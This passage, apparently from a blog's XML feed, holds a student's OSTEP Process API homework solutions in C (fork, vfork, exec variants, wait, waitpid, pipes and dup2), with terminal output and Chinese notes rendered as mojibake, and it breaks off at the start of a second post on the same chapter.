        <content type="html"><![CDATA[<h2 id="Process-API-Homework"><a href="#Process-API-Homework" class="headerlink" title="Process API Homework"></a>Process API Homework</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">GCCFLAGS= -g -Wall</span><br><span class="line">TARGET = <span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span></span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span>.c</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(SRC)</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$(SRC)</span> -o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><ol><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line">    <span class="type">pid_t</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">        x = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 1</span><br><span class="line">gcc -g -Wall 1.c -o 1</span><br><span class="line">1.c: In function â€˜mainâ€™:</span><br><span class="line">1.c:20:9: warning: implicit declaration of function â€˜waitâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">         wait(NULL);</span><br><span class="line">         ^</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./1</span><br><span class="line">1</span><br><span class="line">fork 2</span><br><span class="line">fork 3</span><br><span class="line">2</span><br></pre></td></tr></table></figure><blockquote><p>å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹å˜é‡æ²¡æœ‰ä»»ä½•å…³ç³»</p></blockquote><ol start="2"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// #define NDEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./flag&quot;</span>,O_RDWR|O_APPEND);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span>==pid)&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;child&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;child&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// usleep(100);</span></span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;parent&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;parent&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./2</span><br><span class="line">parent:1111111111</span><br><span class="line">child:xxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">parent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxchildxxxxxâ                  </span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥çœ‹å‡ºçˆ¶å­æ˜¯å…±äº«æ–‡ä»¶æè¿°ç¬¦çš„ï¼Œçˆ¶è¿›ç¨‹è¯»åæ–‡ä»¶çš„è¯»å†™ä½ç½®å¾€åç§»åˆ°äº†xxxxxï¼Œå¯ä»¥ç”¨<code>    lseek(fd, 0, SEEK_SET);</code>æŠŠä»–ç§»åˆ°å¼€å¤´</p><p>å¹¶å‘çš„å†™å…¥ç”±äºæ“ä½œç³»ç»Ÿè°ƒåº¦é¡ºåºé—®é¢˜ï¼Œå†™å…¥é¡ºåºæ˜¯éšæœºçš„ï¼Œç«äº‰å…³ç³»çš„ä»–ä»¬å¹¶ä¸èƒ½åŒæ—¶ä½¿ç”¨fdï¼Œæ“ä½œç³»ç»Ÿåº”è¯¥åŠ äº†ä¸€äº›é”</p></blockquote><ol start="3"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        x = <span class="number">66</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello  &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;world-----&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 3</span><br><span class="line">gcc -g -Wall 3.c -o 3</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./3</span><br><span class="line">hello  world-----66â    </span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥è°ƒç”¨vforkå‡½æ•°ï¼Œå’Œforkå‡½æ•°çš„åŒºåˆ«å°±æ˜¯ä»–ä¼šé˜»å¡çˆ¶è¿›ç¨‹ï¼Œç›´åˆ°å­è¿›ç¨‹è°ƒç”¨execæˆ–exitæ‰æ¢å¤è°ƒåº¦å¯èƒ½ï¼Œåœ¨æ­¤ä¹‹å‰å’Œçˆ¶è¿›ç¨‹å…±äº«æ‰€ä»¥å†…å­˜åŒ…æ‹¬æ ˆï¼å¯ä»¥çœ‹çš„xå·²ç»è¢«ä¿®æ”¹</p></blockquote><ol start="4"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="type">char</span>* cmd = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* name = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* arg[] = &#123; <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// execl(cmd, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</span></span><br><span class="line">        execlp(name, <span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// execve(cmd, arg, envp);</span></span><br><span class="line">        <span class="comment">// execv(cmd, arg);</span></span><br><span class="line">        <span class="comment">// execvp(name, arg);</span></span><br><span class="line">        <span class="comment">// execle(cmd, &quot;ls&quot;, NULL, envp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥execä¸ºå‰ç¼€</p><ul><li>l(list)ä½¿ç”¨å‚æ•°åœ°å€åˆ—è¡¨,ä»¥ç©ºæŒ‡é’ˆç»“æŸæ ‡å¿—<code>execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</code>ã€‚ç¬¬äºŒä¸ªå‚æ•°lsæ²¡æœ‰å¤ªå¤§æ„ä¹‰ï¼Œå¦‚æœè¦ç»™lsä¼ å‚å¿…é¡»å†™ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œ</li><li>v(vector) ä»¥ NULLç»“å°¾å­—ç¬¦ä¸²æ•°ç»„çš„æŒ‡é’ˆä½œå‚æ•°</li><li>p(path) PATHç¯å¢ƒå˜é‡æŒ‡å®šçš„ç›®å½•æœç´¢å¯æ‰§è¡Œæ–‡ä»¶,å¯ä»¥ä¸ç”¨å†™è·¯å¾„</li><li>e(environment) å¯ä»¥ä¼ å­˜æœ‰ç¯å¢ƒå˜é‡envpå­—ç¬¦ä¸²åœ°å€çš„æŒ‡é’ˆæ•°ç»„çš„åœ°å€ï¼Œæ— åç¼€eçš„è¯ä½¿ç”¨å½“å‰è¿›ç¨‹ç¯å¢ƒå˜é‡</li></ul></blockquote><ol start="5"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;gr&quot;</span>);</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rs);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        assert(pid == rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rxer@grxer /m/h/S/O/o/cpu-api&gt; make 5</span><br><span class="line">gcc -g -Wall 5.c -o 5</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./5</span><br><span class="line">gr</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><blockquote><p>çˆ¶è¿›ç¨‹waitæˆåŠŸç­‰å¾…äº†è¿”å›å­è¿›ç¨‹idï¼Œå¦åˆ™-1ï¼Œå­è¿›ç¨‹è¿”å›-1</p></blockquote><ol start="6"><li></li></ol><blockquote><p>å…¶ä»–æ›´ç²¾ç»†çš„äº‹æƒ…ï¼Œæ¯”å¦‚éé˜»å¡ç­‰å¾…ï¼šå¸Œæœ›å­è¿›ç¨‹é€€å‡ºèƒ½å¤Ÿè¢«æˆ‘çˆ¶è¿›ç¨‹æ£€æµ‹åˆ°ï¼ŒåŒæ—¶æˆ‘åˆä¸å¸Œæœ›æˆ‘çˆ¶è¿›ç¨‹å¤„äºé˜»å¡ç­‰å¾…<code>waitpid(pid,NULL,WNOHANG)</code></p></blockquote><ol start="7"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child hello&quot;</span>);</span><br><span class="line">        close(STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent : hello&quot;</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; world\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 7</span><br><span class="line">gcc -g -Wall 7.c -o 7</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./7</span><br><span class="line">parent : hello world</span><br></pre></td></tr></table></figure><blockquote><p>æ²¡æœ‰è¾“å‡ºçš„åŒæ—¶å¯ä»¥çœ‹å‡ºå­è¿›ç¨‹ç»§æ‰¿äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œä½†æ˜¯ç»§æ‰¿è¿‡åå°±æ˜¯ç§æœ‰çš„äº†ï¼Œä¸ä¼šå½±å“çˆ¶è¿›ç¨‹</p></blockquote><ol start="8"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> pidfd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> res = pipe(pidfd);</span><br><span class="line">    assert(<span class="number">0</span> == res);</span><br><span class="line">    pid[<span class="number">0</span>] = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid[<span class="number">0</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork1 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">0</span>]) &#123;</span><br><span class="line">        close(pidfd[<span class="number">0</span>]);<span class="comment">//read</span></span><br><span class="line">        assert(dup2(pidfd[<span class="number">1</span>], STDOUT_FILENO) == STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i am from pid[0]&quot;</span>);</span><br><span class="line">        close(pidfd[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        pid[<span class="number">1</span>] = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid[<span class="number">1</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork2 fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            close(pidfd[<span class="number">1</span>]);<span class="comment">//write</span></span><br><span class="line">            assert(dup2(pidfd[<span class="number">0</span>], STDIN_FILENO) == STDIN_FILENO);</span><br><span class="line">            read(STDIN_FILENO,buf,<span class="number">30</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;pid[1]:where are you from??\n %s&quot;</span>,buf);</span><br><span class="line">            close(pidfd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            waitpid(pid[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">            waitpid(pid[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 8</span><br><span class="line">gcc -g -Wall 8.c -o 8</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./8</span><br><span class="line">pid[1]:where are you from??</span><br><span class="line"> i am from pid[0]â      </span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span>;</span><br><span class="line">æˆåŠŸè¿”å›<span class="number">0</span> å¤±è´¥è¿”å›<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>ç®¡é“ï¼šåŠåŒå·¥é€šé“ï¼Œåªå…è®¸æ•°æ®åœ¨ä¸€ä¸ªæ–¹å‘ä¸Šä¼ è¾“çš„é€šé“ã€‚å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¸èƒ½åŒæ—¶å‘é€æ•°æ®ï¼Œåªèƒ½è½®æµè¿›è¡Œå‘é€å’Œæ¥æ”¶ã€‚ç”¨äºè¿›ç¨‹é—´é€šä¿¡</p><p>pipeå‡½æ•°åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œpipefdè¿”å›ç®¡é“ä¸¤ç«¯çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œpipefd[0]æ˜¯è¯»ç«¯ï¼Œpipefd[1]æ˜¯å†™ç«¯</p><p>ç®¡é“å¯ä»¥ç†è§£ä¸ºè¿›ç¨‹å…±ç”¨çš„å†…æ ¸ç©ºé—´é‡Œçš„ä¸€å—å†…å­˜æ¥å……å½“è™šæ‹Ÿæ–‡ä»¶</p><p><img src="/2023/04/12/OSTEP-homework-5-Process-API/webp.webp" alt="img"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line">On success, these system calls <span class="keyword">return</span> the new descriptor.  On error, <span class="number">-1</span></span><br><span class="line">is returned, and errno is <span class="built_in">set</span> appropriately.</span><br></pre></td></tr></table></figure><p>dupå‡½æ•°åˆ›å»ºä¸€ä¸ªoldfdæ–‡ä»¶æè¿°ç¬¦çš„å‰¯æœ¬(è€Œä¸”æ˜¯åŠ¨æ€çš„å‰¯æœ¬ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªï¼Œåªä¸è¿‡èµ·äº†ä¸åŒåå­—)ï¼Œä¸è¿‡ä¸å…±äº«æ–‡ä»¶æè¿°ç¬¦æ ‡å¿—ï¼Œè¿”å›æ–°æ–‡ä»¶æè¿°ç¬¦æ˜¯å–ç³»ç»Ÿå½“å‰å¯ç”¨çš„æœ€å°æ•´æ•°å€¼</p><p>dup2 å’ŒdupåŠŸèƒ½ä¸€æ ·ï¼Œä¸è¿‡å®ƒå¯ä»¥ç”¨newfdæŒ‡å®šè¿”å›çš„æ–°æ–‡ä»¶æè¿°ç¬¦å·ï¼Œå¦‚æœnewfdæ˜¯ä¸€ä¸ªå·²ç»æ‰“å¼€çš„æè¿°ç¬¦ï¼Œä¼šæŠŠä»–å…ˆå…³é—­</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API</title>
      <link href="/2023/04/11/OSTEP-5-Process-API/"/>
      <url>/2023/04/11/OSTEP-5-Process-API/</url>
      
        <content type="html"><![CDATA[<h2 id="A-Little-Bit-Process-API"><a href="#A-Little-Bit-Process-API" class="headerlink" title="A Little Bit Process API"></a>A Little Bit Process API</h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d) by 